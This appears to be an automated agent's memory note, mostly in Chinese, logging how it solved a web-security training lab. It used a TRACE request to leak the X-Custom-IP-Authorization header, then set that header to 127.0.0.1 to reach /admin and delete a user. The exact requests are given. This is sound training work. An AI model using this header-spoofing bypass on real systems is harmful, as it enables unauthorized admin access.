---
metadata:
  node_type: memory
name: "PRS arm A lab-infoleak-authentication-bypass"
description: "arm A 基线:lab-infoleak-authentication-bypass 冷实例一次通过 - TRACE 回显泄 X-Custom-IP-Authorization,置 127.0.0.1 过 /admin,删 carlos,banner solved"
last_updated: 2026-10-09T06:55:36+08:00
created: 2026-10-09T06:55:36+08:00
---

## 2026-10-09 — arm A baseline: lab-infoleak-authentication-bypass 冷实例一次通过

实例：`https://0aeb001e03b0924180fef44700fc004e.web-security-academy.net/`（range_launch reuse:false，无 exploit server）。

链路（全走件，4 步）：
1. `page_read` lab 页取 widget-lab-id `2C1FFA3C…3C226`；`range_launch launch-url` 起实例（jar /tmp/cj1.json）。
2. `http_dump /admin` → 401（匿名被拒）。
3. `raw_http --request-line 'TRACE /admin HTTP/1.1'` → 200 message/http，回显请求头，泄出前端自定义头 **`X-Custom-IP-Authorization`**（TRACE 回波即信息泄露面）。
4. `http_dump /admin --header 'X-Custom-IP-Authorization: 127.0.0.1'` → 200 管理面板（含 `/admin/delete?username=carlos`）；`http_dump .../admin/delete?username=carlos` 带同头 → 302 Location /admin；`banner_verdict` → solved_class true，「Congratulations, you solved the lab!」

要点：
- 信息泄露靠 **TRACE 方法回显请求头**，头名 `X-Custom-IP-Authorization`，值给 `127.0.0.1` 即骗过前端源址鉴权。
- `http_dump` 只支持 GET|POST，非标准方法（TRACE/PATCH/DELETE）须走 `raw_http` 字节级请求行。
- 无 exploit server（range_launch exploit_server:null 可信），也不需要。
- 未 git 提交。

